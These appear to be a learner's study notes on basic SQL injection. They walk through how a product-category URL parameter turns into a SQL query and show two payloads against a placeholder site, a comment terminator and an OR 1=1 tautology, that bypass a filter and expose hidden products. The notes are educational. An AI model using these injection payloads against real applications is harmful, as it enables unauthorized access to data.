This causes the application to make a SQL query to retrieve details of the relevant products from the database:  ?? How ??

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

- all details ("star")
- from the products table
- where the category is Gifts
- and released is 1.

 The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:
 
```sql
https://insecure-website.com/products?category=Gifts'--
```
This results in the SQL query:
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

its a comment that removes the end of the query

it removes =1 and shows hidden

---------------------

display all the products in any category, including categories that they don't know about:
```sql
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```


Warning